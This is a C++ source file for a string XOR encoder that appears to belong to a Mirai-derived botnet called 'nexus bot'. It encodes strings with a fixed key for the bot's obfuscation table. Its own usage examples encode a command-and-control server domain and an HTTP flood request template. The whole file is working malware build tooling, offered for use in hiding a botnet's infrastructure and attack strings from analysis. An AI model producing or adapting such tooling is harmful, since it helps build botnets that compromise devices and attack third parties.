// enc.cpp — string XOR encoder for the obfuscation table.
//
// Takes a plaintext string and XOR-encodes it with the bot's key,
// outputting hex bytes ready to paste into obfuscate.cpp's
// store_plaintext() calls. Mirrors Mirai's tools/enc.c utility.
//
// Build:  g++ -std=c++17 -o enc enc.cpp
// Usage:  enc "cnc.your-server.com"
//         enc "GET %s HTTP/1.1\r\nHost: %s\r\n..."

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>

constexpr uint32_t XOR_KEY = 0x45F83A21;

int main(int argc, char* argv[]) {
    if (argc < 2) {
        fprintf(stderr, "usage: enc <string>\n");
        fprintf(stderr, "  XOR-encodes a string for the nexus bot obfuscation table.\n");
        fprintf(stderr, "  key: 0x%08X\n", XOR_KEY);
        return 1;
    }

    const char* input = argv[1];
    size_t len = strlen(input);

    const uint8_t k0 = (XOR_KEY >> 24) & 0xFF;
    const uint8_t k1 = (XOR_KEY >> 16) & 0xFF;
    const uint8_t k2 = (XOR_KEY >> 8)  & 0xFF;
    const uint8_t k3 =  XOR_KEY        & 0xFF;

    printf("// Encrypted (%zu bytes):\n", len);
    printf("\"");
    for (size_t i = 0; i < len; ++i) {
        uint8_t b = static_cast<uint8_t>(input[i]);
        switch (i % 4) {
            case 0: b ^= k0; break;
            case 1: b ^= k1; break;
            case 2: b ^= k2; break;
            case 3: b ^= k3; break;
        }
        printf("\\x%02X", b);

        // Line-wrap every 16 bytes for readability.
        if ((i + 1) % 16 == 0 && i + 1 < len) {
            printf("\"\n\"");
        }
    }
    printf("\"\n");

    return 0;
}
